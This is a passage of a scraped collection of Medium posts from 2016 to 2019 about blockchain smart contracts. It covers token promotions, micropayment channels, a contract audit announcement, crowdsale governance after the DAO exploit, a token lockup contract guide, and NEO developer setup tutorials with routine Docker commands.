contracts.Savings\u200a\u2014\u200aSmart contract can also provide savings due to the elimination of expenses incurred by middlemen.Disadvantages of smart contractsDespite of having many advantages, smart contracts have some disadvantages too.Smart contract based on blockchain framework is a new concept. Thus, people have limited knowledge and resources on it.Making changes or altering transaction information is not possible with smart contracts. Although it is advantageous as it maintains transparency but it could be daunting when a transaction happens by mistake.Third party agents do not disappear completely as they get new role.At last I would just like to say if you like our post then follow us onhttps://medium.com/@laxmicoinhttps://www.facebook.com/laxmicoin/https://twitter.com/Laxmicoin/https://www.instagram.com/laxmicoinofficial/", "responses": ""}, {"title": "Swap Smart Contract\u00a0Strength", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-smart-contract-strength-adfd192bed87?source=search_post", "post_date": "Oct 22, 2018", "readtime": "3 min read", "upvotes": "1", "content": "Swap Smart Contract\u00a0StrengthCryptoswap GlobalBlockedUnblockFollowFollowingOct 22, 2018Smart Contracts on the blockchain are programmable, self-executing digital contracts that facilitate, verify, and execute the terms of a given agreement between users on the blockchain. They are responsible for accessing and storing public, decentralized data of different nature. Because nobody owns or can tamper with that data, everybody can trust it.Independent, autonomousSmart contract is appealing for many reasons. No need to rely on third parties, capital may be biased or not of interest to you. Smart contract is executed exactly the code is set, make sure no errors occurred.The process is done the contract is automatically by. At the same time you create a contract, no longer have to depend on brokers, lawyers or anyone else. As such, it also deletes the risk comes from a third party. The application of Smart Contract can be used in various fields in the future, at present a number of areas have developed smart contract include: Electronic Money, logistics, banking, real estate, even as the election.TrustYour document is encoded on the share ledger and all parties have can have access to them.With organizations such as Government, contract can provide 1 level other transparency for the translation agreement. Decentralized system of transparency for ever\u200a\u2014\u200aCryptoswap Global\u200a\u2014\u200athat you can trust, was built based on our confidence and the trust of the you for us. All your account information, your token balance, each of the transactions taking place on the system are listed a cash clear, clean and transparent.SafeThe document is encrypted, which makes the hackers are almost impossible to check out be. Blockchain will make sure a security for your document. Not a hacker would threaten them.The document was copied many times in 1 Blockchain and does not cover get \u201clost\u201d. Smart contract using the programming languages, code the software to automate the terms, save every hour for the unnecessary work.SpeedSmart order execution contract action, saves precious time your treasure. The automatic contract not only faster and cheaper but also avoid common errors when It only takes a few seconds for all transactions is through. You typically encounter many problems about the speed of transactions on the centralized system or blockchain system obsolete, take too much time to start trading on time and finished products when the transaction successfully. Cryptoswap brought to you a solution to improve all the things that you worry. You have to take up several minutes to hours to sync but when using our product, you take less than a minute to make transactions and get back token directly to address for individuals through smart contract.SaveSmart contracts help you Save a sum of money is charged for intermediaries. Smart contract save you tons of money thanks to remove stitches. Your document is encoded on a general ledger, which means that cannot be lost. With Blockchain, all the ones you have stored your document again. Using Cryptoswap is the smart solution for managing your time and money. With only 1 mouse clicks you can capture everything in hand. Save time, save on transaction costs and confirm the transaction on the system. Optimize your time to the fullest extent.", "responses": ""}, {"title": "A User-to-User Smart Contract Micropayment", "author_name": "Ryan X. Charles", "link": "https://stories.yours.org/a-user-to-user-smart-contract-micropayment-6a6a435341a?source=search_post", "post_date": "Jul 31, 2016", "readtime": "6 min read", "upvotes": "1", "content": "A User-to-User Smart Contract MicropaymentRyan X. CharlesBlockedUnblockFollowFollowingJul 31, 2016Four months ago we started spending all of our developer effort on bitcoin micropayments. We have since designed our own shallow version of a smart contract payment channel network similar to and inspired by the Lightning Network. Designing it was the first step, and the next step was to implement it. As of today we have successfully tested our first user-to-user smart contract micropayment in a simulated environment. In other words, our micropayments technology has reached proof-of-concept stage. For more technical information, please see the appendix.While our tests prove that the technology will work, there is still a good deal of work left to do. The next step for us is to finish edge cases in the implementation, particularly opening and closing channels automatically. Then we will run a \u201creal\u201d test on bitcoin testnet. After that we will integrate the micropayments technology into our app, and then we can launch a preview to an invite-only audience on testnet.Building micropayments technology is so time consuming it\u2019s worth reflecting on why we believe this is important. On Yours, users will pay for content that is inexpensive by the standards of traditional media\u200a\u2014\u200aon the order of one cent. Traditional payment systems, like PayPal, charge fees that are far higher than this, on the order of thirty cents. It would not be worth paying one cent for content if you had to pay a thirty cent fee. Even bitcoin\u2019s fees of roughly five cents are too high for this.However, smart contracts on top of bitcoin allow users to guarantee payments to each other with cryptography. These smart contracts do not need to be on the blockchain. However, since these smart contracts do not have the irreversible security guarantees of transactions on the blockchain, it is possible for users to violate the contracts. But when a user violates the contract, other users involved in the contract can broadcast transactions to the blockchain to end the contract at that point. If Carol has received ten cents from Alice, and then Alice begins violating contracts, Carol can broadcast her latest transaction to the blockchain, get her ten cents, and she never has to deal with Alice again. The blockchain is a dispute mediator with a five cent fee.There has long been an argument that small payments are too small to be worth the psychological cost of deciding whether to make the payment. But the converse should also be considered\u200a\u2014\u200areceiving a tiny payment is disproportionately rewarding given its size. We believe that this more than makes up for the psychological cost of making a payment, since even curators on Yours can earn money. It\u2019s worth it to make a small payment on Yours, because the joy of profiting is worth more than the value involved. Yours gamifies internet content.We estimate that by September we will have implemented the protocol edge cases and be able to perform a micropayment on bitcoin testnet. That will be a good point for us to try to estimate a timeline to launch. The remaining difficulties will be integrating micropayments into the product in a way that doesn\u2019t bewilder a mainstream audience. That will be difficult and will not happen instantly, although we have already done a lot of theoretical work to prepare for that.Let\u2019s take this opportunity to consider a couple of questions people keep asking us:If Yours is totally decentralized, what do you do about\u00a0trolls?Yours is not totally decentralized. Although we once called this project a \u201cdecentralized reddit,\u201d we have narrowed our scope to finish the project sooner. The only thing decentralized about Yours are the payments. Yours does not hold anyone\u2019s money. Yours will moderate content like every other social media app. Our focus is on getting content creators paid, not on censorship resistance.What\u2019s the difference between Yours and\u00a0Steem?Yours uses bitcoin, not a new cryptocurrency. Bitcoin has the largest ecosystem and is therefore the most useful and valuable blockchain for our purposes. We believe creating a new cryptocurrency is a distraction from the primary goal\u200a\u2014\u200agetting content creators paid. When you make a payment on Yours, you are investing directly into a piece of content, and therefore the content creator, not an unrelated cryptocurrency. We believe our approach is much more direct about getting the right people paid the right amounts. See this article.Appendix: Technical DetailsThe Yours protocol is inspired by the Lightning Network, but is not equivalent to it. Our design has one technical limitation which is that because segregated witness has not launched yet, there is presently no way to build a non-malleable transaction. Therefore, our funding transactions are subject to transaction malleability. However, we believe this will only be a minor problem in the early days when we have a small audience. People who fund channels are not incentivized to malleate the funding transaction, and third parties on the network will find it difficult to do so. Once the funding transaction is confirmed, there are no more known vulnerabilities with our protocol design. Once segregated witness is live on bitcoin mainnet, we will adopt it for our funding transactions, and there will be no known vulnerability at all.We are using HTLC (Hash Time-Lock Contract) transactions, like the original design of the Lightning Network. The Lightning Network team has since adopted a different set of contracts, but we have decided launching sooner outweighs the gains of a perfect protocol. We will improve our protocol design over time, after launch, when we have reasons to do so. We hope to ultimately be compatible with whatever the standard is in the bitcoin world.An outdated protocol specification is available here. We will publish a whitepaper sometime after launch.Our protocol has four layers. The base layer is a messaging layer. This layer fundamentally distinguishes micropayments from bitcoin proper\u200a\u2014\u200ausers need to be in direct communication with one another to send and receive a payment. Users are identified with a BIP 32 extended public key which they use to sign and encrypt messages and generate bitcoin addresses. The messaging layer happens through a server and is not decentralized (but you don\u2019t have to trust our server\u200a\u2014\u200awe can\u2019t read your messages). This allows us to launch much sooner than building on top of a decentralized messaging layer.On top of the messaging layer is the channel layer. We have a custom protocol for establishing, updating, and closing a channel between two users. The thesis of the channel layer is that each user, say Alice and Bob, maintain two commitment transactions, one belonging to Alice and one belonging to Bob. If Alice or Bob wish to close the channel at any time, they simply broadcast the latest commitment transaction that they own. If they broadcast an earlier transaction, they risk losing their money\u200a\u2014\u200athis is a security feature that gives the channels an irreversible-like property. Users are incentivized to play by the rules, and can broadcast the latest transaction if one user stops playing by the rules.On top of the channel layer is the route layer. In order for Alice to make a payment to Carol, she either needs a channel directly to Carol, or she needs to find someone who has a channel to Carol. If Bob has a channel to both Alice and Carol, Bob can act as a Smart Contract Oracle for the payment to communicate the payment from Alice to Carol. On launch, Yours will have one Smart Contract Oracle shared by everyone. Although this is a topologically centralized design, it\u2019s important to recognize that the Yours Smart Contract Oracle never has access to anyone\u2019s money. The Oracle is the Yours version of a Lightning Network node and our network is analogous to a Lightning Network where everyone is connected to the same node.On top of the route layer is the application layer. This is the normal bitcoin wallet embedded in the Yours front-end that manages private keys. The bitcoin wallet can send micropayments using the route layer to any other Yours user.As of today, the thing we have actually tested is the following. We have simulated Alice establishing a payment channel to Bob, and Bob establishing a payment channel to Carol. That is, Alice <-> Bob <-> Carol. Alice then makes a payment to Carol. Alice, Bob and Carol exchange four channel-level messages each, and one route-level message each, and Carol ends up with the payment. The payment used a fake funding transaction that was not broadcast to any blockchain\u200a\u2014\u200ahence \u201csimulated\u201d. Performing the same simulation on a real blockchain will require broadcasting transactions and monitoring the blockchain, which we have not yet added to our micropayment codebase. We will do that after we finish implementing the protocol.", "responses": ""}, {"title": "Full audit of our Smart Contract by HACKEN is completed!", "author_name": "TruePlay", "link": "https://medium.com/@TruePlayInfo/we-have-made-a-full-audit-of-our-smart-contract-6c811db92ab7?source=search_post", "post_date": "Sep 12, 2018", "readtime": "2 min read", "upvotes": "", "content": "Full audit of our Smart Contract by HACKEN is completed!TruePlayBlockedUnblockFollowFollowingSep 12, 2018Smart contract is one of the most important parts of any token. Generally, it works in the similar way as an ordinary agreement between the client and an existing company, however, in terms of Blockchain it is implemented into token and forces both sides of any deal to follow the set rules. It is essential to develop smart contract properly because it is literally embedded into crypto token and cannot be changed after token release.TruePlay.io faced with some unexpected issued with their smart contract, but all of the problems were solved immediately. But first things first. TruePlay is a B2B platform with a complex of software solutions for the online gaming business. This project creates a transparent and honest platform for Gambling while been not a gambling provider. TruePlay only allows licensed gambling companies access to their software. Its technologies are aimed at developing online gaming and making it as legal and transparent as possible from any point of view.TPLAY is a token created by TruePlay for platform needs. And in addition to smart contract TPLAY includes Honesty Control System based on Blockchain technology. This is a unique solution for online gambling industry and it is vital to include HCS into modern casino, as a tool to prevent fraud and to provide transparency of every game.TruePlay\u2019s first token edition was suffering small weaknesses. Firstly, during its evolvement, TruePlay decided to change the model of its incentive system from outmoded discount scheme into a bonus system that is more transparent and totally fits the whole idea of the project. Additionally, the amount of issuing tokens was not enough to meet the needs of TruePlay. Initially it was planned to create 70 million TPLAYs but after a bunch of researches, it was recommended to release 100 million TPLAYs. This led to the following reasonable decision\u200a\u2014\u200athe company decided to update their smart contract.After adding features mentioned above into smart contract, there was made another wise step, that should be made by any token issuer. TPLAY Coin was analyzed and audited by Hacken O\u00dc and it was stated that \u201cOverall quality of reviewed contracts is high and no major \ufb01xes are required. The contract contains only low to lowest issues, which can\u2019t have a serious impact on contract functionality\u201d. And these issues are already resolved. The full text of Hacken Audit can be found on TruePlay Medium blog.Mistakes were made and the most important is that they were solved immediately. I can advise any other ICO project to scrutinize their tokens and smart contracts. Rewriting of a Blockchain based token is a hard and meticulous process, yet sometimes it has to be done. I\u2019m happy that it was made just in timeMageramov OleksiyCEO of TruePlay", "responses": ""}, {"title": "Smart Contracts And Decentralised Crowdsale", "author_name": "Plutus", "link": "https://medium.com/@PlutusIT/smart-contracts-and-decentralised-crowdsale-79f9fbacddd1?source=search_post", "post_date": "Jun 19, 2016", "readtime": "4 min read", "upvotes": "1", "content": "Smart Contracts And Decentralised CrowdsalePlutusBlockedUnblockFollowFollowingJun 19, 2016After the exploit was found in an experimental contract code designed for crowdfunding, we received explicit warnings from the Ethereum Foundation against the deployment of complex contracts with large volumes until the situation is resolved. This development has prompted us to make some improvements regarding the Pluton crowdsale governing procedure, to ensure the safety of the funds used to buy Plutons.We simply cannot risk the future of Plutus.it or it\u2019s users support by relying on a third party services or a unstable contract code to protect the funds aswell as the remaining 95.75% allocated for the rebate system until the PlutusDEX and its rebate contract code is battle hardened and thoroughly tested by our developers and community.What is Pluton and its rebate\u00a0system?The Pluton crowdsale contract which was being tested but have opted against; decentralises the issuance of 4.25% of Plutons to the crowdsale participants and then secures the remaining 95.75% only to be accessed by the DEX contract for the rebate system. The Pluton crowdsale distribution contract (a work in progress) is available on our Github.The current events are an evidence for us not to rush the deployment of an important dApp that Plutus.it and it\u2019s supporter have to rely on. Such complex smart contract can only be deployed until it can be fully researched and tested to assure it is secure. This is the primary requirement for the longevity and success of Plutus.it, which aims to be the next generation payment system powered by the Ethereum smart contracts.So after much consideration and in light of the current developments we have made a decision of a tried and trusted, a more traditional method of manual token distribution and fund raise described below.Additionally we have also added a precautionary cap to stop the sale early if the sale exceeds our expectations and if it meets the requirements for long term development and operational plans. However, to avoid implying any early valuation by us for the Pluton tokens we can not set the cap too narrow or too high.We want our supporters and participants to determine it\u2019s value freely as well as allow space for the growth of the ecosystem and protect the value of Plutons. As a result we have decided to reduce the sale cap by more than half to 15,000 BTC as well as reserve the right to end the sale early with a 24hr notice, if the results are beyond our expectations (which are far lower than the set cap amount).Crowdsale Governance and Road MapSale will last only for 10 Days (date/time will be announced shortly).20,000,000 Pluton (PLU) will be created (source code).4.25% (850,000) PLU will be sold in an initial public offering. The bonus stage will only last during the first 3 days.95.75% Plutons will be held in a multisig smart contract only to be accessible by the PlutusDEX contract. Plutus.it does NOT own these tokens. The Plutus Board will secure the remaining Plutons until the DEX is developed and deployed with the rebate system.Multi-signature and smart contract wallet access will be secured between 5 members of the Plutus.it Board. The crowdsale governing board will have an overview of these wallets, each holding a key required for consensus to access any of the funds locked in these accounts.Pluton Crowdsale Board Members Appointment and fund release road map: Plutus.it Board Meeting Minutes (PDF).All accounts and transactions above will be verifiable and recorded on the blockchain. We will in this case take complete responsibility in securing and appropriate management of the funds raised.Trusting humans who\u2019s primary interest is to protect the ecosystem instead of a unproven code is currently the best way to insure the longevity of Plutus.it and it\u2019s supporters. The supervisory board will also publish their minutes to public channels as well as a hash of the document containing may also be stored on the blockchain.And finally to our supporters who may not be familiar with Ethereum. It is a protocol that enables the building of smart contract, so if any exploits are found, it is because in the creation of the particular contract code. So we would like to assure you that the Ethereum protocol itself is secure and optimal for the development of the PlutusDEX.If you have any questions then please feel free to join our growing community in slack, reddit or any of our social media channels.We sincerely thank you for the support.Yours Plutus.it Team_______________________________________________________________Please read our previous posts if you need any more information:PLUTON CROWDSALE\u200a\u2014\u200aHOW IT WILL WORK (Update V0.2)The Plutus team has been working overtime to finalise all the details for the Pluton sale. For the Plutus Founding\u2026medium.comAn In-Depth Look At Plutus.it (+ Frequently Asked Questions)What a week! Due to an incredibly high volume of incoming questions on email & social media, we have decided to publish\u2026medium.comThe Great Migration to the Blockchain EcosystemThe advent of blockchain and trustless computing has opened doors for the next generation of trade and commerce\u200a\u2014\u200aand\u2026medium.com", "responses": ""}, {"title": "Creating a Smart Contract\u00a0Bank", "author_name": "Nick Doiron", "link": "https://medium.com/@mapmeld/creating-a-smart-contract-bank-2f39fa35a546?source=search_post", "post_date": "Sep 25, 2016", "readtime": "3 min read", "upvotes": "1", "content": "Creating a Smart Contract\u00a0BankNick DoironBlockedUnblockFollowFollowingSep 25, 2016This past summer a program known as the DAO raised an estimated $168 million before it was exploited to release its money by a mysterious account known only as \u2018the attacker\u2019. The DAO was intended to be the first autonomous venture capital fund; its program would make funding decisions solely by calculating the will of voting shareholders.To run independently from its programmers, the DAO was built on Ethereum, a distributed computing network inspired by Bitcoin. Instead of a program existing on one computer or website, everyone can see the code, the investors, and the transactions in the blockchain.The flaw in the DAO was not part of Bitcoin, the blockchain, or the concept of self-managing programs in Ethereum (known as \u2018smart contracts\u2019). The problem was that there was no kill switch, no launch key, before the DAO spent its funds. The code which the attacker used had been public and functioned as it was written\u200a\u2014\u200ait just wasn\u2019t apparent that it was exploitable until it was too late. In the aftermath, there\u2019s a reasonable skepticism about putting money into Ethereum or smart contracts, similar to the skepticism that many people have about Bitcoin after several exchanges were hacked or closed down.How do we revive smart contracts?I want to see a Smart Contract Bank with a developer dashboard and a bank interface.Easy developer set-up. Right now it\u2019s incredibly difficult to compile a contract for the first time.The developer dashboard would be similar to AWS EC2 or a bot-manager. You have several bots running, you can toggle them on/off, and you can monitor what they\u2019re doing.Preset contracts and web UI for essential human controls (on/off switch, human sign-off on actions). These controls would be implemented and verifiable on the Ethereum blockchain, but accessible to a web user with one click.A friendly UI for bank users\u200a\u2014\u200asuppose that I have a contract that pays employees through Ethereum. The Smart Contract Bank would provide addresses for employees to receive, spend, and exchange Ethereum currency without any additional scripts or controls.Outside-blockchain notifications (i.e. e-mail) to tell bank users when a contract acts, when it is out of funds, when it is enabled or disabled. Returning to the employee example, you should be notified if your payroll contract stops running.Web integrations (such as GitHub) which activate smart contract rewards.At any point you could easily withdraw your money or manage your Ethereum contracts manually. People use the platform because it\u2019s convenient and they want to do it.The closest existing tool appears to be Ether.Fund, but I wasn\u2019t able to register when I tried earlier this week.I would need to know more about multi-sig accounts to decide how that would be implemented, how it affects smart contracts, etc.Building the\u00a0MVPThe MVP for this would be a simple contract with a kill switch, then practical stuff like an escrow account or a reusable GitHub rewards system (which could be set up on the bank repo itself!).Here\u2019s my first smart contract (work in progress) in the Solidity smart contract language. A kill switch exists which can only be activated by the contract creator. In the Smart Contract Bank, there would be a type of permissions preset to allow your web and personal accounts to issue controls:Currently you can\u2019t have a public function that receives a string array\u2026 I tried using a comma-delimited string, but currently it\u2019s not possible to send an arbitrary number of words. In an actual game you could have an addWord function to expand the stored array, but I wanted to keep this simple.The tricky part is actually compiling and executing a contract, which I won\u2019t go into here, but the Ethereum GitHub Wiki has the most up-to-date information. The hurdles in creating a contract are yet another reason to have a user and developer-friendly bank.", "responses": ""}, {"title": "Smart Contract Lockup Public Testing & Ecosystem Token\u00a0Update", "author_name": "Gifto Official", "link": "https://medium.com/@gifto/smart-contract-lockup-public-testing-ecosystem-token-update-97068151240a?source=search_post", "post_date": "Mar 20", "readtime": "5 min read", "upvotes": "1", "content": "Smart Contract Lockup Public Testing & Ecosystem Token\u00a0UpdateGifto OfficialBlockedUnblockFollowFollowingMar 20In our journey towards mass adoption and realizing our Gifto vision we have emphasized transparency with our community on Gifto token allocation and management. In late 2018, we announced our plans for token releases to power the ecosystem as well as for delayed release under a smart-contract lockup of \u201cCompany Reserve\u201d.Announcing Open Testing of Company Reserve Lockup Smart\u00a0ContractAs per this announcement, we have developed a smart contract to demonstrate our long-term commitment to the Gifto token and enable the Gifto community to publicly monitor the release schedule of Company Reserve tokens. Note that as per our last announcement, the exact details of the release schedule may be subject to change.The smart contract provides a failsafe, only to be used in a catastrophic emergency, which would enable the early movement of the tokens. The failsafe can only be activated if at least three of five team members agree to do so and would release the tokens to a pre-designated wallet.Since we intend to lockup a very large amount of tokens, for full transparency and also extended security testing, we are posting the latest test version of the smart contract with a nominal amount of Gifto effective immediately, for the community to help us test. We have already received feedback from two smart contract security auditing companies, but are publicizing the test contract out of an abundance of caution. We expect to be able to officially enable the smart contract to lock up tokens in Q2.See the smart contract here.First Release of 2019 Ecosystem Tokens for Imminent Partnership ImplementationAs announced previously, we plan to release up to 50mm GTO\u2019s each year to further power the ecosystem and grow usage. The first release of 2019 will consist of 20 million GTO\u2019s to support major new partnerships and their implementations in the next few months. These partnerships will mark brand new use cases for GTO which have substantial potential to help us fulfill the Gifto vision. Details on the first partnership will be announced next week, as it has its implementation and timing requirements. Please stay tuned.As we move forward with developing more real-life use cases for Gifto, we will keep the community informed with any news update regarding token management. We thank you for all your support, and we will keep working towards fulfilling our whitepaper vision.Smart Contract quickstartOverviewThe smart contract enables us to set a timed-release of tokens to a Gifto-managed wallet.Example scenarioThe smart contract is published with 100m tokens, designating that the tokens will be locked up for two years, with a release of 1/8th of total tokens (12.5m tokens) every quarter. Five partners (Gifto team members) are designated with the ability to activate the quarterly transfers, if and only if, the amount of tokens to be transferred have satisfied the timed-release requirement.Once every quarter, an incremental 12.5m tokens are made available to transfer from the smart contract to the Company Reserve (aka \u201cbeneficiary wallet\u201d) address, a Gifto-team managed wallet.After the first quarter completes, a Gifto team member (any one of five total partners) runs the contract, initiating a transfer for 12.5m tokens.Note: The parameters used in the test contract are not the same as those used in this example. They are temporary and for testing purposes.Partners\u200a\u2014\u200adetailsWhen the smart contract is initiated, five Gifto project members will be named as partners. Partners have the ability to do two things:Initiate the withdrawal of any released tokens to the Gifto-project\u2019s pre-designated beneficiary wallet owned by the Gifto project.If at least three of five partners vote to cancel (revoke) the smart contract, the smart contract is canceled, and all tokens in the contract are immediately sent to the beneficiary address. This \u201cfailsafe\u201d is meant only to be used in the event of a catastrophic emergency.Reading the contract (anyone can do this, no gas\u00a0needed)View contract on EtherscanvoteAgreeCount\u200a\u2014\u200aReturns latest number of votes to cancel the smart contract.releasableAmount\u200a\u2014\u200aInput the Gifto ERC-20 token smart contract address. Returns the total number of tokens which satisfy the time-based vesting requirements and may be transferred to the beneficiary (team) wallet.beneficiary\u200a\u2014\u200aTeam wallet address which tokens may be transferred to once they satisfy the time-based vesting requirements. In the event the contract is cancelled (revoked), tokens will also be transferred here.isRevocable\u200a\u2014\u200aReturns whether or not the smart contract can be cancelled (revoked). This is only TRUE if at least three of five \u201cpartners\u201d vote to cancel the contract and is meant only to be used in the event of a catastrophic emergency.releaseStart\u200a\u2014\u200aTime in the future when the token vesting begins.owner\u200a\u2014\u200aThe address which published the contract.interval\u200a\u2014\u200aThe period of time in seconds which must elapse, after the vesting start date (releaseStart), before tokens are made available for transfer to the beneficiary.released\u200a\u2014\u200aInput the Gifto ERC-20 token address, and it will return how many Gifto have been actually transferred to the beneficiary wallet.times\u200a\u2014\u200aThe amount of token release events throughout the vest. For example, eight times over a two-year period.partnerCount\u200a\u2014\u200aNumber of partners who can execute a transfer of releasable tokens (satisfy time-based vesting requirement). Also, if three of five partners vote to cancel the contract, it will transfer all tokens to the beneficiary wallet.revoked\u200a\u2014\u200aNumber of tokens which have been transferred to the beneficiary wallet due to a cancellation of the smart contract.Writing the contract (only partners or owner, gas\u00a0needed)View contract on Etherscanrelease\u200a\u2014\u200aInput Gifto token address. When run by any owner or partner, will transfer any fully-vested tokens to the beneficiary address.revoke\u200a\u2014\u200aInput Gifto token address. When run by any owner or partner, will initiate smart contract cancellation and transfer all tokens to the beneficiary address if and only if three or more partners have voted to revoke the contract.revokeVoting\u200a\u2014\u200aInput TRUE or FALSE. A partner can vote to cancel (revoke) the smart contract in the event of a catastrophic emergency. At least three of the five partners are required to set this as TRUE for a partner or owner to initiate the revocation process.", "responses": ""}, {"title": "#Ether 3: Video walk through of your first Smart contract deployment.", "author_name": "makoto_inoue", "link": "https://decentralize.today/ether-3-video-walk-through-of-your-first-smart-contracts-deployment-f4c36908f01f?source=search_post", "post_date": "Mar 29, 2016", "readtime": "2 min read", "upvotes": "2", "content": "#Ether 3: Video walk through of your first Smart contract deployment.makoto_inoueBlockedUnblockFollowFollowingMar 29, 2016Seeing is believing. There are many people who seem to understand blockchain by reading lots of articles, but I don\u2019t understand a thing until I write codes, excutes them,then interact with them.Back in 2005, when I first learnt about a shiny web framework called RubyOnRails, I was excited to watch a video called \u201cBuilding a blog in 15 minutes with DHH\u201d.I remember I spent next 2 hours replaying the video again and again to build my first ever web app. At the end of the 2 hours, I actually had a working blog up and running.When I started Ethereum tutorial page called \u201cCREATE YOUR OWNcrypto-currency WITH ETHEREUM\u201d, I\u2019ve been stack for almost 2 weeks and I still don\u2019t feel that I fully understood.It may be because this decentralized app\u00a0, world computer, and the whole blockchian thing is too foreign for me to comprehend.To help myself understand (and hopefuly it can help other people undestand the tutorial a bit quicker than I did), I recorded the video of the first part of the deployment.Things I captured in this video.How to copy&paste the code into Ethereum Wallet.Understanding startup function (aka. initializer, constructor) through their document bug (now fixed)Demonstrating how to use the contract to send new token from one account to another.Demonstraing how a newly deployed contract is committed into Ethereum.Explaining that http://testnet.etherscan.io shows its transaction historyThey may look obvious by just reading the docs but sometimes it\u2019s hard to navigate GUI by reading docs and watching videos may be a lot easier.Things I still don\u2019t understandThere are still lots of unanswered questions even after I played with the example.My biggest question is that what it take to be recognized as a token contract.Are the existing of certain fields(eg: name, symbol, totalSupply)?How does it know which functions are executed when sending fund from one account to another?There are functions such as approveAndCall and transferFrom. Are they in use when sending funds?Would be great if someone more knowledgeable than me can comment or update the doc.", "responses": ""}, {"title": "Neo Smart Contract Development -Part\u00a07", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-7-14a590f76c7?source=search_post", "post_date": "May 14, 2018", "readtime": "3 min read", "upvotes": "1", "content": "Neo Smart Contract Development -Part\u00a07Download, install and test NEO privatenet Docker containerGaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Attribution\u200a\u2014\u200aThis series is republish work of Michael Herman (Toronto) from his Git Repository. All claps and Praise goes to him.PurposeThe purpose of this activity is to download, install and test the NEO private network (privatenet) Docker container using the Docker platform installed in the previous activity to insure we can build and deploy NEO smart contracts to privatenet.Goals, Non-Goals and AssumptionsEnsure you have a working and properly configured set of NEO developer tools for creating and building smart contracts in Visual Studio with the C# programming languagePrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possibleDownload and install the NEO privatenet Docker ContainerTo ensure Docker is installed and running, start the Powershell console and enter docker run hello-world (and press Enter).Figure 7.1. Docker Run Hello-World2. To download the NEO Docker container and run it, run the following script:docker pull metachris/neo-privnet-with-gasdocker run -d --name neo-privnet-with-gas -p 20333-20336:20333-20336/tcp -p 30333-30336:30333-30336/tcp metachris/neo-privnet-with-gaspauseScript: NEO Docker Download/Install/Run (./scripts/neodockerinstall.bat.txt)The script produces the following output:Figure 7.2. NEO Docker Download/Install/RunTest the NEO privatenet Docker Container3. To test the NEO Docker container, run following script:REM cd opt/neo-pythonREM python3 prompt.py -pREM block 0docker exec -it neo-privnet-with-gas /bin/bashpauseScript: NEO Docker Python CLI/Shell (./scripts/neodockerpshell.bat.txt)4. The above script will open a bash console for the NEO container. Execute the following commands in the Bash console to start the NEO Python CLI:cd opt/neo-pythonpython3 prompt.py -p5. The above commands will start the NEO Python CLI. Execute the following commands to verify the NEO container (and NEO node) is working:block 0exitIn total, the last 3 tasks produce the following output:Figure 7.3. NEO Docker\u00a0TestThe tasks for this activity are complete. Proceed to Activity 8\u200a\u2014\u200aCreate and compile HelloWorld smart contract sample.Additional NotesFor a client app to access the NEO privatenet you just created, your NEO app will need to replace the 2 JSON configuration files with the contents of the following JSON files:config.json: (./json/config.neodocker.json)protocol.json: (./json/protocol.neodocker.json)To switch over from an existing NEO network to this privatenet, make sure you:Delete your old blockchain database folderDelete your old peers.dat fileStart neo-gui.exeRe-index your databaseScript LibraryNEO Docker Download/Install/Run (./scripts/neodockerinstall.bat.txt)NEO Docker Stop/Remove (./scripts/neodockeruninstall.bat.txt)NEO Docker Start (./scripts/neodockerstart.bat.txt)NEO Docker Stop (./scripts/neodockerstop.bat.txt)NEO Docker Restart (./scripts/neodockerrestart.bat.txt)NEO Docker Reset (./scripts/neodockerreset.bat.txt)NEO Docker Python CLI/Shell (./scripts/neodockerpshell.bat.txt)References[DOCKER] docker.com, Install Docker for Windows from [https://docs.docker.com/docker-for-windows/install/] (https://docs.docker.com/docker-for-windows/install/)[NEODOCKER1] metachris, metachris/neo-privnet-with-gas from [https://hub.docker.com/r/metachris/neo-privnet-with-gas/]https://hub.docker.com/r/metachris/neo-privnet-with-gas/()[NEODOCKER2] CityOfZion project, CityOfZion/neo-privatenet-docker from https://github.com/CityOfZion/neo-privatenet-docker[NEODOCKER3] Chris Haer, How to run a private network of the NEO blockchain from https://medium.com/proof-of-working/how-to-run-a-private-network-of-the-neo-blockchain-d83004557359", "responses": ""}, {"title": "Neo Smart Contract Development\u200a\u2014\u200aPart\u00a02", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-2-3abe22e140b8?source=search_post", "post_date": "May 14, 2018", "readtime": "4 min read", "upvotes": "50", "content": "Neo Smart Contract Development\u200a\u2014\u200aPart\u00a02Download and install Visual Studio 2017 Community Edition integrated development environment (IDE)Gaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Attribution\u200a\u2014\u200aThis series is republish work of Michael Herman (Toronto) from his Git Repository. All claps and Praise goes to him.PurposeThe purpose of this activity is to download, install and perform basic configuration Visual Studio 2017 Community Edition if you don\u2019t already have an existing version of Visual Studio 2017 installed.Goals, Non-Goals and AssumptionsEnsure you have a working and properly configured version of Visual Studio 2017 installedAny additional Visual Studio customization steps are decribed in subsequent activities.Visual Studio 2017 will install side-by-side with previous versions/editions of Visual Studio without affecting them (other than reducing your free disk space). This includes Visual Studio 2015 and Visual Studio Code, etc.PrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possibleDownload and install Visual Studio 2017 Community Edition integrated development environment (IDE)There are 2 scenarios:Scenario 1\u200a\u2014\u200aYou don\u2019t have any version of Visual Studio 2017 installedScenario 2\u200a\u2014\u200aYou have an existing verson of Visual Studio 2017 installedIf Scenario 1 applies to you, you need to perform the tasks in Scenario 1 and then skip Scenario 2.If only scenario 2 applies to you, you can skip the tasks in Scenario 1 and only perform the tasks in Scenario 2.In addition, it is quite useful to have the Visual Studio Code installed on your computer. The installation and configuration of Visual Studio Code is documented as Scenario 3 and is optional but recommended.Visual Studio Code is a code editor redefined and optimized for building and debugging modern web and cloud applications. Visual Studio Code is free and available on your favorite platform\u200a\u2014\u200aLinux, Mac OSX, and Windows. [VSCODE]Scenario 1\u200a\u2014\u200aYou don\u2019t have any version of Visual Studio 2017 installedDownload the Visual Studio 2017 installer from either of:Generic Visual Studio downloads site (all editions) 